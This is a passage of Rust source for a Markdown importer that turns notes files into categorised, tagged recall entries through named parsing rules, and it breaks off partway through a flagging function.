//! Structure-aware Markdown importer.
//!
//! Turns a notes file into recall entries. Nothing here is positional guesswork:
//! every decision is a named rule, applied in this order, and `--dry-run`
//! reports how often each one fired.
//!
//!   1. `mdscan` cleans the text (page furniture, fence repair) and finds the
//!      headings — `#` to `######`, banners, and plain-text ones like
//!      `3️⃣ Title` / `Step 4 — Title`. A `#` inside code is a comment.
//!   2. Headings form a tree. An entry is a heading plus the text up to the
//!      next heading of any level; pure containers (no body) are dropped and
//!      their children become the entries.
//!   3. Titles are cleaned (markup, numbering), and made meaningful and unique
//!      with the *parent heading* ("Docker — Best Practices"), never with a
//!      bare counter unless two entries are otherwise indistinguishable.
//!   4. Category comes from what the section is (`categorize`): a profile of
//!      one program — the heading names it and the body describes it — is a
//!      `tool`; one that is mostly commands is a `command`; prose is a `note`,
//!      even when it mentions a few commands along the way.
//!   5. `tool` is the program the entry is about: named by the heading, else
//!      the program most of its commands run, else empty — never "whatever
//!      came first". Tags and search keywords come from the heading path.
//!   6. A section too long to read as one entry is split at paragraph breaks
//!      (never inside a code block), not silently truncated.
//!
//! One section is one entry: the commands in it are never copied out into
//! entries of their own, so nothing in the database says the same thing twice.

use std::collections::{HashMap, HashSet};
use std::path::Path;

use anyhow::{Context, Result};

use crate::{
    danger::danger_reason,
    db::Database,
    derive::{self, Vocab},
    mdscan::{self, HeadKind},
    models::{fenced_blocks_lang, Category, NewEntry, Source},
    pairs::{self, BlockKind},
};

// The top-level banners -> short slug used as the primary tag / context.
const BANNERS: &[(&str, &str)] = &[
    ("LINUX & SYSTEM ADMINISTRATION", "linux"),
    ("GIT & GITHUB", "git"),
    ("TMUX", "tmux"),
    ("VIM / NEOVIM", "vim"),
    ("CLI CHEATSHEETS & REFERENCE", "cli"),
    ("ENCRYPTION & SECURITY", "crypto"),
    ("WINDOWS", "windows"),
    ("MISCELLANEOUS", "misc"),
];

// Pure navigation. (A "Quick Reference Card" is real content — a whole cheat sheet — so it is kept.)
const NAV_DROP: &[&str] = &["table of contents", "quick navigation", "print this", "tags"];
const GENERIC: &[&str] = &[
    "overview", "examples", "use when", "best practices", "troubleshooting", "configuration",
    "installation", "prerequisites", "conclusion", "quick reference",
    "quick reference commands", "core concepts", "mental model", "syntax",
    "description", "advanced features", "security hardening", "key learning points",
    "additional resources", "additional tools", "advanced configuration",
    "pro tips", "tips & tricks",
];
/// A heading naming one of these (and no command in the body) is about tools.
const TOOL_WORDS: &[&str] = &["tool", "tools", "toolkit", "framework", "suite", "utility", "utilities"];
/// Prose that outweighs the commands in it this much — at least `PROSE_MIN` lines of
/// it, more than `PROSE_PER_CMD` per command line — is an article, not a command entry.
const PROSE_MIN: usize = 12;
const PROSE_PER_CMD: usize = 3;
const MAX_PART: usize = 6000; // a section longer than this is split at paragraph breaks
const HARD_CAP: usize = 20000; // last resort: one block (e.g. a script) longer than this is truncated

pub struct ImportOptions {
    pub dry_run:      bool,
    pub flagged_only: bool,
    pub extra_tags:   Vec<String>,
}

pub struct ImportStats {
    pub candidates: usize,  // entries that passed all content filters
    pub skipped:    usize,  // headings dropped (nav/empty/flag filter)
    pub duplicates: usize,  // entries skipped because identical data already exists
    pub report:     Report, // what the parser did, rule by rule
}

/// How often each parsing rule fired — printed by `recall import`.
#[derive(Debug, Default)]
pub struct Report {
    pub cleanup:       mdscan::Cleanup,
    pub headings:      usize,
    pub soft_headings: usize,
    pub list_items:    usize,
    pub commands:      usize,
    pub notes:         usize,
    pub tools:         usize,
    pub with_tool:     usize,
    /// Tool entries that are a profile of one program (the heading names it).
    pub profiles:      usize,
    /// Note entries that hold a few commands but are mostly prose.
    pub prose_notes:   usize,
    pub qualified:     usize,
    pub repeats:       usize,
    pub split:         usize,
    pub truncated:     usize,
    pub median_chars:  usize,
    pub largest:       Option<(usize, String)>,
}

fn fmt_n(n: usize) -> String {
    let s = n.to_string();
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        if i > 0 && (s.len() - i) % 3 == 0 {
            out.push(',');
        }
        out.push(c);
    }
    out
}

impl Report {
    pub fn render(&self) -> String {
        let c = &self.cleanup;
        let mut rows: Vec<String> = Vec::new();
        rows.push(format!(
            "  headings   {} found ({} plain-text like \"3️⃣ Title\" / \"Step 4 — Title\"); {} list items that a converter had turned into headings put back",
            fmt_n(self.headings), fmt_n(self.soft_headings), fmt_n(self.list_items)
        ));
        let mut cleaned: Vec<String> = Vec::new();
        if c.furniture > 0 {
            cleaned.push(format!("{} page header/footer lines removed", fmt_n(c.furniture)));
        }
        if c.unwrapped > 0 {
            cleaned.push(format!("{} ```markdown wrappers unwrapped", c.unwrapped));
        }
        if c.closed_fences > 0 {
            cleaned.push(format!("{} unclosed code blocks closed", c.closed_fences));
        }
        if c.stray_fences > 0 {
            cleaned.push(format!("{} stray code fences dropped", c.stray_fences));
        }
        if !cleaned.is_empty() {
            rows.push(format!("  cleaned    {}", cleaned.join(", ")));
        }
        rows.push(format!(
            "  entries    {} command · {} note · {} tool — tool identified on {}",
            fmt_n(self.commands), fmt_n(self.notes), fmt_n(self.tools), fmt_n(self.with_tool)
        ));
        let mut sorted: Vec<String> = Vec::new();
        if self.profiles > 0 {
            sorted.push(format!("{} program profiles filed as tool (the heading names the program)", fmt_n(self.profiles)));
        }
        if self.prose_notes > 0 {
            sorted.push(format!("{} articles that only mention a few commands filed as note", fmt_n(self.prose_notes)));
        }
        if !sorted.is_empty() {
            rows.push(format!("  sorted     {}", sorted.join(", ")));
        }
        let mut shaped: Vec<String> = Vec::new();
        if self.qualified > 0 {
            shaped.push(format!("{} titles made unique with their parent heading", fmt_n(self.qualified)));
        }
        if self.repeats > 0 {
            shaped.push(format!("{} repeated sections dropped (same heading path, identical text)", fmt_n(self.repeats)));
        }
        if self.split > 0 {
            shaped.push(format!("{} long sections split at paragraph breaks", self.split));
        }
        if self.truncated > 0 {
            shaped.push(format!("{} entries truncated at {} chars", self.truncated, fmt_n(HARD_CAP)));
        }
        if !shaped.is_empty() {
            rows.push(format!("  shaped     {}", shaped.join(", ")));
        }
        if let Some((n, t)) = &self.largest {
            rows.push(format!("  size       median {} chars, largest {} chars (\"{}\")", fmt_n(self.median_chars), fmt_n(*n), t));
        }
        rows.join("\n")
    }
}

// ─── text helpers ────────────────────────────────────────────────────────────

/// Remove real HTML tags (`<a id="x"></a>`, `<br>`, `</b>`), and only those:
/// a bare `<` / `>` (as in the heading "`<<` (Here Document)") is text, and so
/// is anything inside backticks.
fn strip_html(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut in_code = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '`' {
            in_code = !in_code;
        }
        if c == '<' && !in_code && chars.get(i + 1).is_some_and(|n| n.is_ascii_alphabetic() || *n == '/' || *n == '!') {
            if let Some(rel) = chars[i..].iter().take(300).position(|&x| x == '>') {
                i += rel + 1;
                continue;
            }
        }
        out.push(c);
        i += 1;
    }
    out
}

/// `[text](url)` -> `text`
fn strip_md_links(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::new();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '[' {
            if let Some(rel) = chars[i + 1..].iter().position(|&c| c == ']') {
                let close = i + 1 + rel;
                if chars.get(close + 1) == Some(&'(') {
                    if let Some(rel2) = chars[close + 2..].iter().position(|&c| c == ')') {
                        out.extend(&chars[i + 1..close]);
                        i = close + 2 + rel2 + 1;
                        continue;
                    }
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

/// Strip leading decoration — emoji, variation selectors, `*`/`#`/`=`/`-` runs —
/// but not ASCII that carries meaning: the `<` of "`<` (Less Than)", `~/.bashrc`, `(2FA)`.
fn strip_leading_symbols(s: &str) -> String {
    s.trim_start_matches(|c: char| {
        !c.is_alphanumeric() && (!c.is_ascii() || c.is_whitespace() || matches!(c, '*' | '#' | '=' | '_' | '-' | '+'))
    })
    .to_string()
}

/// "3.1 The First Line", "13.2.4. Title" -> the title. Decimal section numbers
/// are unambiguous, so they always go.
fn strip_decimal_numbering(s: &str) -> Option<&str> {
    let b = s.as_bytes();
    let mut i = 0;
    let mut groups = 0;
    loop {
        let start = i;
        while i < b.len() && b[i].is_ascii_digit() {
            i += 1;
        }
        if i == start {
            return None;
        }
        groups += 1;
        if i + 1 < b.len() && b[i] == b'.' && b[i + 1].is_ascii_digit() {
            i += 1;
            continue;
        }
        break;
    }
    if groups < 2 {
        return None;
    }
    if i < b.len() && (b[i] == b'.' || b[i] == b')') {
        i += 1;
    }
    let rest = &s[i..];
    rest.starts_with(char::is_whitespace).then(|| rest.trim_start())
}

/// Strip list numbering like `1) `, `2. `, `3: `, or the keycap form `1️⃣ `.
/// A bare number followed only by a space (e.g. "5 things") is left intact —
/// `strip_sibling_numbers` decides that one, with the siblings in view.
fn strip_leading_numbering(s: &str) -> String {
    if let Some(rest) = strip_decimal_numbering(s) {
        return rest.to_string();
    }
    let chars: Vec<char> = s.chars().collect();
    if chars.first().map_or(true, |c| !c.is_ascii_digit()) {
        return s.to_string();
    }
    let mut i = 0;
    while i < chars.len() && chars[i].is_ascii_digit() {
        i += 1;
    }
    let mut j = i;
    let mut saw_sep = false;
    while j < chars.len()
        && matches!(chars[j], '\u{FE0F}' | '\u{20E3}' | ')' | '.' | ':')
    {
        j += 1;
        saw_sep = true;
    }
    if !saw_sep {
        return s.to_string(); // "2FA", "7z", "5 things" -> unchanged
    }
    while j < chars.len() && chars[j].is_whitespace() {
        j += 1;
    }
    chars[j..].iter().collect()
}

fn collapse_ws(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Drop a dangling "(" left by a title that a PDF line-wrap cut in two:
/// "Lock down your accounts (highest" -> "Lock down your accounts".
fn fix_parens(s: &str) -> String {
    let open = s.matches('(').count();
    let close = s.matches(')').count();
    if open > close {
        if let Some(pos) = s.rfind('(') {
            if !s[pos..].contains(')') {
                return s[..pos].trim_end().to_string();
            }
        }
    }
    s.to_string()
}

fn clean_title(raw: &str) -> String {
    let mut t = strip_html(raw).replace("**", "").replace('`', "");
    t = strip_md_links(&t);
    t = t.trim().to_string();
    t = strip_leading_symbols(&t);
    t = strip_leading_numbering(&t);
    t = strip_leading_symbols(&t); // numbering may expose more leading symbols
    let t = t.trim().trim_end_matches(':').trim().to_string();
    fix_parens(&collapse_ws(&t))
}

fn slug(s: &str, max: usize) -> String {
    let cleaned = strip_html(s).replace("**", "");
    let mut out = String::new();
    for c in cleaned.chars() {
        if c.is_alphanumeric() {
            out.extend(c.to_lowercase());
        } else if c == ' ' || c == '-' || c == '_' {
            out.push('-');
        }
    }
    // collapse consecutive dashes
    let mut collapsed = String::new();
    let mut prev_dash = false;
    for c in out.chars() {
        if c == '-' {
            if !prev_dash {
                collapsed.push('-');
            }
            prev_dash = true;
        } else {
            collapsed.push(c);
            prev_dash = false;
        }
    }
    let chars: Vec<char> = collapsed.trim_matches('-').chars().collect();
    if chars.len() <= max {
        return chars.iter().collect();
    }
    let mut cut = chars[..max].to_vec();
    if let Some(pos) = cut.iter().rposition(|&c| c == '-') {
        if pos >= 8 {
            cut.truncate(pos); // trim to a word boundary, not mid-word
        }
    }
    cut.iter().collect::<String>().trim_matches('-').to_string()
}

/// Blank lines, horizontal rules (`---`) and banner rules (`# =====`) at either
/// edge of a body are decoration, not content.
fn strip_decor(body: &str) -> String {
    let decor = |l: &str| {
        let t = l.trim();
        t.is_empty() || (t.len() >= 3 && t.chars().all(|c| matches!(c, '-' | '*' | '_' | '=' | '#' | '~' | ' ')))
    };
    let lines: Vec<&str> = body.lines().collect();
    let start = lines.iter().position(|l| !decor(l)).unwrap_or(lines.len());
    let end = lines.iter().rposition(|l| !decor(l)).map_or(start, |p| p + 1);
    lines[start..end].join("\n")
}

fn cap_chars(s: &str, max: usize) -> (String, bool) {
    if s.chars().count() <= max {
        return (s.to_string(), false);
    }
    let cut: String = s.chars().take(max).collect();
    (format!("{}\n\n… [truncated — full text in the source file]", cut.trim_end()), true)
}

/// `1. [Title](#anchor)` / `- [Title](#anchor)`: a line that is nothing but a link to a section.
/// A table row that merely *contains* such a link is content.
fn is_toc_line(l: &str) -> bool {
    let t = l.trim();
    let t = t.strip_prefix(['-', '*', '+']).map(str::trim_start).unwrap_or_else(|| {
        let digits = t.bytes().take_while(|b| b.is_ascii_digit()).count();
        match t[digits..].strip_prefix(['.', ')']) {
            Some(rest) if digits > 0 => rest.trim_start(),
            _ => t,
        }
    });
    t.starts_with('[') && t.ends_with(')') && t.contains("](#") && !t.contains('|')
}

/// A section that is only a list of links to other sections is a table of contents.
fn toc_like(body: &str) -> bool {
    let lines: Vec<&str> = body.lines().filter(|l| !l.trim().is_empty()).collect();
    lines.len() >= 3 && lines.iter().filter(|l| is_toc_line(l)).count() * 10 >= lines.len() * 7
}

fn banner_slug(title: &str) -> Option<&'static str> {
    BANNERS.iter().find(|(name, _)| name.eq_ignore_ascii_case(title)).map(|(_, s)| *s)
}

// ─── the heading tree ────────────────────────────────────────────────────────

struct Node {
    at:     usize,
    level:  u8,
    kind:   HeadKind,
    raw:    String,
    title:  String,
    parent: Option<usize>,
    body:   String,
}

/// `2 Getting Help` -> (2, byte offset of "Getting Help").
fn lead_number(title: &str) -> Option<(u32, usize)> {
    let digits = title.bytes().take_while(|b| b.is_ascii_digit()).count();
    if digits == 0 || digits > 3 || !title[digits..].starts_with(' ') {
        return None;
    }
    let rest = title[digits..].trim_start_matches([' ', '-', '–', '—', ':']);
    (!rest.is_empty()).then(|| (title[..digits].parse().unwrap_or(0), title.len() - rest.len()))
}

/// "1 Introduction", "2 Getting Help", "3 Tools": strip the numbers, but only
/// when siblings really count up — "5 things" or "2 Factor Auth" alone stay.
fn strip_sibling_numbers(nodes: &mut [Node]) {
    let mut groups: HashMap<Option<usize>, Vec<usize>> = HashMap::new();
    for (i, n) in nodes.iter().enumerate() {
        groups.entry(n.parent).or_default().push(i);
    }
    for idxs in groups.values() {
        let nums: Vec<(usize, u32, usize)> = idxs
            .iter()
            .filter_map(|&i| lead_number(&nodes[i].title).map(|(n, off)| (i, n, off)))
            .collect();
        if nums.windows(2).any(|w| w[1].1 == w[0].1 + 1) {
            for (i, _, off) in nums {
                nodes[i].title = nodes[i].title[off..].trim().to_string();
            }
        }
    }
}

/// Cleaned titles of the ancestors, nearest first.
fn ancestors(nodes: &[Node], i: usize) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = nodes[i].parent;
    while let Some(p) = cur {
        if !nodes[p].title.is_empty() {
            out.push(nodes[p].title.clone());
        }
        cur = nodes[p].parent;
    }
    out
}

fn is_generic(t: &str) -> bool {
    GENERIC.contains(&t.to_lowercase().as_str())
}

/// The nearest ancestor worth naming: not itself generic, not the same as the title.
fn context_of(title: &str, ancestors: &[String]) -> Option<String> {
    let ts = slug(title, 24);
    ancestors.iter().find(|a| !is_generic(a) && slug(a, 24) != ts).cloned()
}

/// "Examples" alone says nothing: "Docker — Examples". Very short titles get the same.
fn display_title(title: &str, ancestors: &[String]) -> String {
    if is_generic(title) || title.chars().count() < 8 {
        if let Some(ctx) = context_of(title, ancestors) {
            return format!("{} — {}", ctx, title);
        }
    }
    title.to_string()
}

/// The nearest heading at level 1–2 (the entry itself included): the entry's section tag.
fn section_title(nodes: &[Node], i: usize) -> Option<String> {
    let mut cur = Some(i);
    while let Some(c) = cur {
        let n = &nodes[c];
        if n.level <= 2 && n.kind != HeadKind::Banner && banner_slug(&n.title).is_none() && !n.title.is_empty() {
            return Some(n.title.clone());
        }
        cur = n.parent;
    }
    None
}

// ─── body analysis ───────────────────────────────────────────────────────────

#[derive(Default)]
struct Analysis {
    /// Copy-ready command: the first command block, or first run of command lines.
    command:     String,
    /// Any command the entry contains looks destructive.
    danger:      bool,
    /// The program of every command line, in order.
    programs:    Vec<String>,
    fenced_cmd:  bool,
    unfenced:    usize,
    /// `` - `cmd` - description `` bullets and table rows whose code is a command.
    inline:      usize,
    text_lines:  usize,
    /// Every line that would be typed: in command blocks, unfenced, and in bullets/tables.
    cmd_lines:   usize,
    /// How much prose there is outside code, in lines (see `prose_weight`).
    prose:       usize,
    /// `vim` / `tmux` / `awk` fences (and key tables in a vim/tmux section) name their own tool.
    lang_tool:   Option<String>,
}

/// How much reading a line of text outside code is: nothing for a bare label
/// (`**Examples:**`, `Basic scans:`), a rule or a table border; otherwise one
/// line per ~100 characters, so a paragraph pasted as one line weighs what it reads like.
fn prose_weight(line: &str) -> usize {
    let t = line.replace("**", "");
    let t = t.trim_start_matches(|c: char| matches!(c, '-' | '*' | '+' | '>' | '|' | '_') || c.is_whitespace()).trim();
    if !t.chars().any(char::is_alphanumeric) {
        return 0;
    }
    if t.split_whitespace().count() <= 4 && t.trim_end_matches(['*', '_']).ends_with(':') {
        return 0;
    }
    t.chars().count().div_ceil(100)
}

/// A line in a key-table block that holds a key: not blank, not a box border, not a comment.
fn is_key_line(l: &str) -> bool {
    let t = l.trim();
    t.chars().any(char::is_alphanumeric) && !t.starts_with("\" ") && !t.starts_with('#')
}

/// Close a run of unfenced command lines (one that is only comments is not a command).
fn flush_group(group: &mut Vec<&str>, groups: &mut Vec<String>) {
    if group.iter().any(|l| !l.starts_with('#')) {
        groups.push(group.iter().map(|l| l.strip_prefix("$ ").unwrap_or(l)).collect::<Vec<_>>().join("\n"));
    }
    group.clear();
}

fn analyze(body: &str, vocab: &Vocab, keys_tool: Option<&str>) -> Analysis {
    let mut a = Analysis::default();
    let mut blocks: Vec<String> = Vec::new();

    for (lang, block) in fenced_blocks_lang(body) {
        let text = block.trim_matches('\n');
        if text.trim().is_empty() {
            continue;
        }
        let kind = pairs::classify(&lang, text, vocab, keys_tool);
        if kind == BlockKind::Other {
            continue; // python, yaml, config, a text box…: not a program invocation
        }
        if matches!(lang.as_str(), "vim" | "tmux" | "awk") {
            a.lang_tool.get_or_insert(lang.clone());
        } else if kind == BlockKind::Keys {
            if let Some(k) = keys_tool {
                a.lang_tool.get_or_insert(k.to_string());
            }
        }
        if kind == BlockKind::Shell {
            let explicit = !lang.is_empty() && !matches!(lang.as_str(), "text" | "txt");
            let unix = !pairs::is_powershell(&lang);
            let typed: Vec<&str> = if explicit {
                // the author said "shell": lines that would be typed (not `Host myserver` directives)
                text.lines().filter(|l| pairs::is_command_line(l, unix)).collect()
            } else {
                // bare fence: believe only command-shaped lines
                text.lines().filter(|l| vocab.command_line(l).is_some()).collect()
            };
            a.cmd_lines += typed.len();
            a.programs.extend(typed.into_iter().flat_map(derive::programs_of_line));
        } else {
            a.cmd_lines += text.lines().filter(|l| is_key_line(l)).count();
        }
        a.fenced_cmd = true;
        blocks.push(text.to_string());
    }

    // Unfenced command lines, grouped: a run of them (comments allowed between) is one command.
    let mut in_code = false;
    let mut group: Vec<&str> = Vec::new();
    let mut groups: Vec<String> = Vec::new();
    for l in body.lines() {
        if l.trim_start().starts_with("```") {
            in_code = !in_code;
            flush_group(&mut group, &mut groups);
            continue;
        }
        if in_code {
            continue;
        }
        let t = l.trim();
        if t.is_empty() {
            flush_group(&mut group, &mut groups);
            continue;
        }
        a.text_lines += 1;
        if vocab.command_line(t).is_some() {
            a.unfenced += 1;
            a.programs.extend(derive::programs_of_line(t));
            group.push(t);
        } else if t.starts_with('#') && !group.is_empty() {
            group.push(t);
        } else {
            flush_group(&mut group, &mut groups);
            if !pairs::is_pair_line(t) {
                a.prose += prose_weight(t);
            }
        }
    }
    flush_group(&mut group, &mut groups);

    // `- `cmd` - what it does` bullets and table rows are commands too — but a flag on
    // its own (`-l`) or notation (`*.log`) only documents one, except as a vim/tmux key.
    let inline: Vec<pairs::Pair> = pairs::inline_pairs(body, keys_tool.is_some())
        .into_iter()
        .filter(|p| keys_tool.is_some() || pairs::is_typed_command(&p.command))
        .collect();
    a.inline = inline.len();
    a.cmd_lines += a.unfenced + a.inline;
    for p in &inline {
        a.programs.extend(derive::programs_of_line(&p.command));
    }

    a.danger = blocks.iter().chain(groups.iter()).any(|c| danger_reason(c).is_some())
        || inline.iter().any(|p| danger_reason(&p.command).is_some());
    a.command = if a.fenced_cmd {
        blocks.into_iter().next().unwrap_or_default()
    } else if let Some(g) = groups.into_iter().next() {
        g
    } else {
        inline.iter().take(12).map(|p| p.command.as_str()).collect::<Vec<_>>().join("\n")
    };
    a
}

/// Which rule decided an entry's category (counted in the report).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Why {
    /// The heading names a program and the body describes it.
    Profile,
    /// The heading is about tools in general ("Security Tools"), with no command in it.
    ToolList,
    /// Commands make up the entry.
    Commands,
    /// There are commands, but they are a few lines in an article.
    Prose,
    /// Text with no command in it.
    Text,
}

/// Which tab an entry belongs in, from what the section *is*:
///
/// * `tool` — a profile of one program: the heading names it (`ls`, `nmap (Advanced)`,
///   `cat - Concatenate Files`) and the body says what it is or does, not only how to
///   run it. A heading about tools in general ("Security Tools") without commands, too.
/// * `command` — a fenced shell/keys block in which a line would be typed, or command
///   lines (unfenced, or `` - `cmd` - description `` bullets and table rows) that make up
///   a real share of the text (a quarter, or at least three) …
/// * … unless they are a few commands in an article: `PROSE_MIN`+ lines of prose,
///   more than `PROSE_PER_CMD` for every command line, is a `note`.
/// * `note` — everything else.
fn categorize(title_low: &str, names_program: bool, a: &Analysis) -> (Category, Why) {
    let share = |n: usize| n > 0 && (n * 4 >= a.text_lines || n >= 3);
    let has_cmd = a.fenced_cmd || share(a.unfenced) || share(a.inline);
    if names_program && (a.prose >= 2 || !has_cmd) {
        return (Category::Tool, Why::Profile);
    }
    if !has_cmd {
        let words: Vec<&str> = title_low.split(|c: char| !c.is_alphanumeric()).collect();
        if words.iter().any(|w| TOOL_WORDS.contains(w)) {
            return (Category::Tool, Why::ToolList);
        }
        return (Category::Note, Why::Text);
    }
    if a.prose >= PROSE_MIN && a.prose > PROSE_PER_CMD * a.cmd_lines {
        return (Category::Note, Why::Prose);
    }
    (Category::Command, Why::Commands)
}

/// Does the section's own code — fenced blocks and `inline code` — use `name` as a word?
/// (`katoolin.py` and `load mimikatz` count; `dradis-setup` alone does not name `dradis`.)
fn code_mentions(body: &str, name: &str) -> bool {
    let has_word = |text: &str| {
        let text = text.to_lowercase();
        text.match_indices(name).any(|(i, _)| {
            let before = text[..i].chars().next_back();
            let after = text[i + name.len()..].chars().next();
            !before.is_some_and(|c| c.is_alphanumeric() || matches!(c, '-' | '_'))
                && !after.is_some_and(|c| c.is_alphanumeric() || matches!(c, '-' | '_'))
        })
    };
    if fenced_blocks_lang(body).iter().any(|(_, b)| has_word(b)) {
        return true;
    }
    let mut in_code = false;
    body.lines().any(|l| {
        if l.trim_start().starts_with("```") {
            in_code = !in_code;
            return false;
        }
        !in_code && l.split('`').skip(1).step_by(2).any(has_word)
    })
}

/// `nmap (Port Scanning)`, `# find`, `awk — text processing`, `gzip/gunzip`: the heading
/// names the program. A bare single word must be lower case as written; English words
/// that happen to be programs (`Install`, `Time`) don't count. A name the file runs too
/// rarely to be known (`mimikatz`, `openvas`) counts when the section's code uses it.
fn title_tool(title: &str, body: &str, vocab: &Vocab) -> Option<String> {
    let t = title.trim().trim_matches(|c: char| c == '*' || c == '`').trim();
    let end = t.find(|c: char| c.is_whitespace() || matches!(c, '(' | ':' | '—' | '–' | '/')).unwrap_or(t.len());
    let (first, rest) = t.split_at(end);
    let rest = rest.trim();
    let stem = first.to_lowercase();
    let tagline = rest.starts_with(['(', '—', '–', ':']) || rest.starts_with("- ");
    if stem.is_empty() || !(rest.is_empty() || tagline || rest.starts_with('/')) {
        return None;
    }
    if vocab.knows(&stem) {
        let capitalised_word = rest.is_empty() && first.chars().any(|c| c.is_uppercase());
        return (!capitalised_word).then_some(stem);
    }
    // `input/output` is two words, not a program: an unknown name needs to stand alone.
    let alone = rest.is_empty() || tagline;
    (alone && first == stem && derive::could_be_program(&stem) && code_mentions(body, &stem)).then_some(stem)
}

fn pick_tool(heading_tool: Option<&str>, tags: &[String], a: &Analysis, vocab: &Vocab) -> String {
    // Keybinding-heavy topics: the topic *is* the tool, whatever the first line says.
    if let Some(t) = tags.iter().map(|t| t.to_lowercase()).find(|t| t == "vim" || t == "tmux") {
        return t;
    }
    heading_tool
        .map(str::to_string)
        .or_else(|| a.lang_tool.clone())
        .or_else(|| derive::dominant_tool(&a.programs, vocab))
        .unwrap_or_default()
}

/// Search keywords from the heading path: words a person would type that the
/// title itself doesn't hold ("linux", "file operations").
fn context_words(ancestors: &[String], title: &str, doc: Option<&str>) -> String {
    const SKIP: &[&str] = &["the", "and", "for", "with", "from", "your", "guide", "notes", "how"];
    let own: HashSet<String> = title.split(|c: char| !c.is_alphanumeric()).map(|w| w.to_lowercase()).collect();
    let mut seen: HashSet<String> = HashSet::new();
    let mut out: Vec<String> = Vec::new();
    for src in doc.into_iter().chain(ancestors.iter().rev().map(|s| s.as_str())) {
        for w in src.split(|c: char| !c.is_alphanumeric()) {
            let w = w.to_lowercase();
            if w.chars().count() >= 3 && !SKIP.contains(&w.as_str()) && !own.contains(&w) && seen.insert(w.clone()) {
                out.push(w);
            }
        }
    }
    out.truncate(12);
    out.join(" ")
}

// ─── splitting and de-duplicating ────────────────────────────────────────────

/// Pack paragraphs into parts of at most `max` chars. Blank lines inside a code
/// block are not breaks, and a single paragraph or block longer than `max` stays whole.
fn split_body(body: &str, max: usize) -> Vec<String> {
    if body.chars().count() <= max {
        return vec![body.to_string()];
    }
    let mut paras: Vec<String> = Vec::new();
    let mut cur: Vec<&str> = Vec::new();
    let mut in_code = false;
    for l in body.lines() {
        if l.trim_start().starts_with("```") {
            in_code = !in_code;
        }
        if l.trim().is_empty() && !in_code {
            if !cur.is_empty() {
                paras.push(cur.join("\n"));
                cur.clear();
            }
        } else {
            cur.push(l);
        }
    }
    if !cur.is_empty() {
        paras.push(cur.join("\n"));
    }
    let mut parts: Vec<String> = Vec::new();
    let mut acc = String::new();
    for p in paras {
        if !acc.is_empty() && acc.chars().count() + 2 + p.chars().count() > max {
            parts.push(std::mem::take(&mut acc));
        }
        if !acc.is_empty() {
            acc.push_str("\n\n");
        }
        acc.push_str(&p);
    }
    if !acc.is_empty() {
        parts.push(acc);
    }
    parts
}

struct Draft {
    title:     String,
    ancestors: Vec<String>, // nearest first
    entry:     NewEntry,
    /// The rule that chose `entry.category`.
    why:       Why,
}

/// "Examples" under Docker and under Git are different entries: prefix the
/// nearest ancestors that tell them apart ("Docker — Examples"). Only entries
/// that are still identical after that get a counter.
fn qualified(title: &str, ancestors: &[String], depth: usize) -> String {
    let ts = slug(title, 24);
    let low = title.to_lowercase();
    let mut picked: Vec<&str> = Vec::new();
    for a in ancestors {
        if picked.len() == depth {
            break;
        }
        // skip generic parents, and any the title already carries ("Docker — Examples")
        if !is_generic(a) && slug(a, 24) != ts && !low.contains(&a.to_lowercase()) {
            picked.push(a);
        }
    }
    picked.reverse();
    picked.iter().map(|s| s.to_string()).chain(std::iter::once(title.to_string())).collect::<Vec<_>>().join(" — ")
}

/// The same section pasted twice (merged notes overlap) is one entry: same
/// heading, same heading path, same text. Same heading and text under a
/// *different* parent is kept — its context differs.
fn drop_repeats(drafts: &mut Vec<Draft>, report: &mut Report) {
    let mut seen: HashSet<(String, String, Vec<String>)> = HashSet::new();
    let before = drafts.len();
    drafts.retain(|d| seen.insert((d.title.to_lowercase(), d.entry.content.clone(), d.ancestors.clone())));
    report.repeats = before - drafts.len();
}

/// `vim` / `tmux` / `emacs` for a word naming one of those keys tools.
fn keys_tool_name(w: &str) -> Option<&'static str> {
    match w {
        "tmux" => Some("tmux"),
        "vim" | "neovim" | "nvim" => Some("vim"),
        "emacs" => Some("emacs"),
        _ => None,
    }
}

/// The program a keys section is about: a vim/tmux/emacs tag, else the first of those
/// words in the heading path. It is what lets a bare two-column fence be read as a key table.
fn keys_context(tags: &[String], title: &str, anc: &[String]) -> Option<&'static str> {
    tags.iter()
        .find_map(|t| keys_tool_name(&t.to_lowercase()))
        .or_else(|| {
            std::iter::once(title)
                .chain(anc.iter().map(String::as_str))
                .find_map(|text| text.split(|c: char| !c.is_alphanumeric()).find_map(|w| keys_tool_name(&w.to_lowercase())))
        })
}

/// Is the program `t` the keys tool `k` itself (`nvim` in vim notes)?
fn same_keys_tool(t: &str, k: &str) -> bool {
    keys_tool_name(t) == Some(k)
}

fn make_unique(drafts: &mut [Draft], report: &mut Report) {
    let mut groups: HashMap<String, Vec<usize>> = HashMap::new();
    for (i, d) in drafts.iter().enumerate() {
        groups.entry(d.title.to_lowercase()).or_default().push(i);
    }
    let mut dups: Vec<Vec<usize>> = groups.into_values().filter(|g| g.len() > 1).collect();
    dups.sort();
    for mut ids in dups {
        let base = drafts[ids[0]].title.clone();
        for depth in 1..=2 {
            if ids.len() <= 1 {
                break;
            }
            let cands: Vec<String> = ids.iter().map(|&i| qualified(&base, &drafts[i].ancestors, depth)).collect();
            let mut freq: HashMap<String, usize> = HashMap::new();
            for c in &cands {
                *freq.entry(c.to_lowercase()).or_insert(0) += 1;
            }
            let mut still = Vec::new();
            for (&i, c) in ids.iter().zip(&cands) {
                if freq[&c.to_lowercase()] == 1 && *c != base {
                    drafts[i].title = c.clone();
                    report.qualified += 1;
                } else {
                    still.push(i);
                }
            }
            ids = still;
        }
        for (n, &i) in ids.iter().enumerate().skip(1) {
            drafts[i].title = format!("{} ({})", base, n + 1);
            report.qualified += 1;
        }
    }
}

// ─── planning: text -> entries ───────────────────────────────────────────────

struct Plan {
    items:   Vec<NewEntry>,
    skipped: usize,
    report:  Report,
}

fn is_flagged(raw_title: &str, ancestors: &[String]) -> bool {
    let hit = |s: &str| {
        let u = s.to_uppercase();
        u.contains("CRITICAL") || u.contains("IMPORTANT")
    };
